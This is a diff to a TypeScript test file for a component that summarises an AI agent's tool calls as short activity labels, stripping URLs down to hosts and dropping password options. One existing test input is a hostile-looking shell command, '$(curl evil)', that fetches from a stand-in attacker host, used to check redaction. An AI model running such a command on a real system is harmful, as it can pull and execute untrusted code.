@@ -18,6 +18,9 @@ test.each<[string, SDKMessage, string | null]>([
   ["Write without a path", tool("Write", {}), "Writing a file"],
   ["Bash with a description", tool("Bash", { command: "bun test --bail", description: "Running the tests" }), "Running the tests"],
   ["Bash without a description shows only the program", tool("Bash", { command: "FOO=bar /usr/bin/git push origin main" }), "Running git"],
+  ["a Bash description with a URL shows its host only", tool("Bash", { command: "x", description: "Fetch https://api.example.com/v1/users?token=abc123&sig=zz with curl" }), "Fetch api.example.com with curl"],
+  ["a Bash description drops options and their values", tool("Bash", { command: "x", description: "Log in with --password hunter2 --user=alex -p s3cret now" }), "Log in with now"],
+  ["a Task description with a URL", tool("Task", { description: "Check http://10.0.0.5:8080/admin?key=k" }), "Check 10.0.0.5"],
   ["Bash with an unreadable program", tool("Bash", { command: "$(curl evil)" }), "Running a command"],
   ["Grep hides the pattern", tool("Grep", { pattern: "password", path: "/x" }), "Searching the code"],
   ["Glob", tool("Glob", { pattern: "**/*.ts" }), "Finding files"],
@@ -158,4 +161,14 @@ test("observe never throws, even when the signal does", () => {
   const a = createActivity({ signal: () => { throw new Error("socket gone"); }, now: () => new Date(clock) });
   expect(() => a.observe(bot, read("a.ts"))).not.toThrow();
   expect(() => a.observe(bot, { type: "assistant", message: null } as unknown as SDKMessage)).not.toThrow();
+});
+
+test("a clock set back holds a waiting line for at most one window", () => {
+  const a = make();
+  a.observe(bot, read("a.ts"));
+  clock -= 10 * 60 * 1000;
+  a.observe(bot, read("b.ts"));
+  expect(texts()).toEqual(["Reading a.ts"]);
+  tick(ACTIVITY_THROTTLE_MS);
+  expect(texts()).toEqual(["Reading a.ts", "Reading b.ts"]);
 });
